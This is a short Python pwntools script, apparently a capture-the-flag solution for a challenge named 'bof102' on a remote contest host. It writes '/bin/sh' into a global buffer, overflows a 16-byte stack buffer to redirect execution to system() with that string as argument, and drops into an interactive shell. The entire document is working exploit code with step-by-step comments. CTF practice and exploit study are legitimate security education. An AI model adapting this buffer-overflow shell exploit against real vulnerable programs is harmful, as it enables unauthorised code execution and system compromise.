import pwn

elf = pwn.ELF("./bof102")
p = elf.process()
pwn.context.log_level="DEBUG"
pr = pwn.remote("bof102.sstf.site", 1337)

system_addr = elf.symbols['system']


pr.recvuntil(b"Name > ")
pr.sendline("/bin/sh\x00") # Putting /bin/sh to global variable name in scanf("%16s", name);

pr.recvuntil(b" > ")

payload = b"a"*20 # 16 bytes of char payload[16] + 4 bytes EBP
payload += pwn.p32(system_addr) # address of function system
payload += pwn.p32(0) # Return address for function system
payload += pwn.p32(0x804a06c)  #arg1 0x804a06c global variable name

pr.sendline(payload+ b"\n")# Run system call with argument from global variable name /bin/sh
pr.interactive()